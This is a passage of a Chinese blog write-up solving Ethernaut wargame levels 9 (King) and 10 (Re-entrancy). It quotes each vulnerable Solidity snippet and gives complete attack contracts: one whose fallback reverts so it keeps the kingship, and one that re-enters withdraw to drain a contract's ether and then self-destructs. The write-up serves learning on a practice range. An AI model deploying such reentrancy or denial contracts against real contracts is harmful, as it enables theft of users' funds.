+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这就是为什么在提交实例的时候王权会转移, 因为关卡会在提交实例时会转移ether给合约, 而作为king的我们会获得ether并将王权转移给关卡, 所以我们需要做的就是打断这个连续的过程, 很自然的, 我们想到的方法就是<strong>拒绝接受ether</strong>, 这样就不会发生<code>king = msg.sender</code>的王权转移, 所以我们需要调用<code>revert</code>函数.</p>
+<p>攻击合约如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract KingAttacker &#123;</span><br><span class="line"></span><br><span class="line">    constructor() payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address payable _addr) public payable &#123;</span><br><span class="line">        _addr.call&#123;value : msg.value&#125;(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>创建合约时有0.001ether (即1finney).</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414195335301.png" alt="image-20240414195335301"></p>
+<p>合约的王权在关卡手上</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414201845901.png" alt="image-20240414201845901"></p>
+<p>**!错误! **则在部署攻击合约时, 传入2finney</p>
+<p>应该先部署攻击合约, 在调用<code>attack()</code>函数时传入2 finney (因为发生了血的教训, 虽然我也不太清楚为什么不能在部署的时候传入</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414195723789.png" alt="image-20240414195723789"></p>
+<p>然后<code>attack</code>合约</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414195827075.png" alt="image-20240414195827075"></p>
+<p>现在合约的王权属于攻击合约</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240414201912073.png" alt="image-20240414201912073"></p>
+<p>然后<code>submit instance</code>, 这个过程, 因为有<code>fallback</code>方法的存在, 攻击合约会自动拒绝<code>revert()</code>合约的转账, 使得王权无法被转让给关卡.</p>
+<p>![](C:\Users\wjx27\Pictures\Screenshots\屏幕截图 2024-04-14 201413.png)</p>
+<p>(没错, 我在第9关了才发现靶场有官方的简体中文😓, 很明显应该是国人翻译的)</p>
+<h3 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10. Re-entrancy"></a>10. Re-entrancy</h3><p>本关的目标是偷走合约的所有资产.</p>
+<p>源码中关于转账的部分:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint256 _amount) public &#123;</span><br><span class="line">	if (balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">		(bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">        	_amount;</span><br><span class="line">        &#125;</span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个犯了转账步骤上的错误, 即先转账再记账 (正常情况下应该是先记账再转账), 这或许看起来无伤大雅, 但是在区块链中我们学过双花问题, 与之类似, 如果在我们在记账之前多次实现转账, 即在接受合约转账的同时又发起新的转账.</p>
+<p>攻击合约如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface ReentrancyInterface &#123;</span><br><span class="line">    function donate(address _to) external payable;</span><br><span class="line">    function balanceOf(address _who) external view returns (uint256 balance);</span><br><span class="line">    function withdraw(uint256 _amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    ReentrancyInterface ReentrancyImpl;  //目标合约</span><br><span class="line">    uint256 requireValue;  //目标合约中存储的资产</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) payable &#123;</span><br><span class="line">        ReentrancyImpl = ReentrancyInterface(_addr);</span><br><span class="line">        requireValue = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBlance(address _addr) public view returns (uint256) &#123;</span><br><span class="line">        return _addr.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate() public &#123;</span><br><span class="line">        ReentrancyImpl.donate&#123;value:requireValue&#125;(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint _amount) public &#123;</span><br><span class="line">        ReentrancyImpl.withdraw(_amount);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    function destruct() public &#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));  //通过自毁回收剩余的ether</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        uint256 ReentrancyImplValue = address(ReentrancyImpl).balance;</span><br><span class="line">        if (ReentrancyImplValue &gt;= requireValue) &#123;</span><br><span class="line">            withdraw(requireValue);</span><br><span class="line">        &#125;else if (ReentrancyImplValue &gt; 0) &#123;</span><br><span class="line">            withdraw(ReentrancyImplValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>合约上有0.001ether</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240421000341989.png" alt="image-20240421000341989"></p>
+<p>部署0.0005ether在攻击合约中, 以满足<code>withdraw()</code>的要求.</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240420233028642.png" alt="image-20240420233028642"></p>
+<p>调用<code>donate()</code>函数将攻击合约中的0.0005ether转入目标合约中, 现在目标合约有0.0015ether.</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240421001015505.png" alt="image-20240421001015505"></p>
+<p>现在我们发起攻击, 调用<code>withdraw()</code>, 取出0.0005ther.</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240421001223831.png" alt="image-20240421001223831"></p>
+<p>此时, 我们就会完成三次连续的取款 (取款之间没有记账), 目标合约中的资产便被全部取走.</p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240421001625127.png" alt="image-20240421001625127"></p>
+<p><img src="C:\Users\wjx27\AppData\Roaming\Typora\typora-user-images\image-20240421001709054.png" alt="image-20240421001709054"></p>
+<p>再通过自毁回收ether （勤俭持家ing</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Fantome</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://username.github.io/project/2024/07/26/BlockChain-Learning-Blog-2/">https://username.github.io/project/2024/07/26/BlockChain-Learning-Blog-2/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/project/tags/BlockChain/"># BlockChain</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/project/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/project/2024/07/26/BlockChain-Learning-Blog-3/">BlockChain Learning Blog 3</a>
+            
+            
+            <a class="next" rel="next" href="/project/2024/07/26/BlockChain-Learning-Blog-1/">BlockChain Learning Blog 1</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Fantome | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+<div class="theme-info">
+    <div class="powered-by"></div>
+    <span class="post-count">博客全站共{{ totalcount(site) }}字</span>
+  </div>  
+
+    </div>
+</body>
+
+</html>
